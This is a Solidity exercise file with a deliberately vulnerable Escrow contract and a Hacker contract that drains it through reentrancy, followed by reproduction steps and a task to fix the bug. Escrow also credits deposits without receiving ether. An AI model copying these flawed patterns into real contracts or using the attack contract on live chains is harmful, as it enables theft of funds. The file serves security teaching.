
// SPDX-License-Identifier: MIT

pragma solidity ^0.7.1;

contract Escrow {
    mapping(address => uint) escrowBalances;
    constructor() payable {
        escrowBalances[address(this)] = 1000000;
    }  
    
    function depositToEscrow(uint _amount) public
    {
        escrowBalances[msg.sender] = _amount;
    }
    
    function withdrawFund() public {
        //external call
        uint currentBalance = escrowBalances[msg.sender];
        (bool withdrawn, ) = msg.sender.call{value:currentBalance}("");
        if (withdrawn) escrowBalances[msg.sender] = 0;
    }
    
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}
   
contract Hacker {
    Escrow e;
    uint public reentrancy;
    event withdrawnEvent(uint c, uint balance);
    
    constructor(address vulnerable) {
        e = Escrow(vulnerable);
    }
    
    function attack() public {
        e.depositToEscrow(1000000);
        e.withdrawFund();
    }
    
    receive() external payable {
        reentrancy++;
        emit withdrawnEvent(reentrancy, address(e).balance);
        if (reentrancy < 10) {
            e.withdrawFund();
        }
    }
    
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}





// Problem :
// The Escrow has re-entrancy bug. Analyze the Escrow contract manually or using static analysis and fix the re-entrancy bug. Include the fixed version of the Escrow contract as the answer to this question. You can use Remix IDE. Note: You are only required to submit fixed version of Escrow contract and NOT Hacker contract.

// Steps to reproduce re-entrancy bug:
// Deploy Escrow contract using accountA and provide with 10000000 wei during deployment.
// Query the ether balance of Escrow contract using Escrow.getBalance() function. It should be 10000000.
// Deploy Hacker contract using accountB. Provide the Escrow contract's address during deployment.
// Query the ether balance of Hacker contract using Hacker.getBalance() function. It should be 0.
// Now run Hacker.attack().
// Check the balance of Escrow contract using Escrow.getBalance() function. It will become 0. (This is an attack. Ideally it should have been 9000000)
// Check the balance of Hacker contract using Hacker.getBalance() function. It will become 10000000 (ideally it should have been 1000000).